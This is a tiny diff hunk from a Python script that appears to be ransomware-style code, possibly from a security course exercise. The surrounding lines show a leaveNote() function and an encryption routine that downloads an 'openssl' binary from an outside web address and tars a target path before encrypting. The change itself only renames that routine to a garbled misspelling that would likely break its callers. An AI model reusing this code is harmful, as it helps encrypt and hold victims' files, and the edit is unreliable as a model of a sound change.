@@ -68,7 +68,7 @@ def leaveNote():
 #################################################################
 # Download the encryption program
 #################################################################
-def downloadAndEncrypt(path):
+def downloadAndEncrsssypt(path):
 	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl","openssl")
 	# create a tar
 	createTar(path)
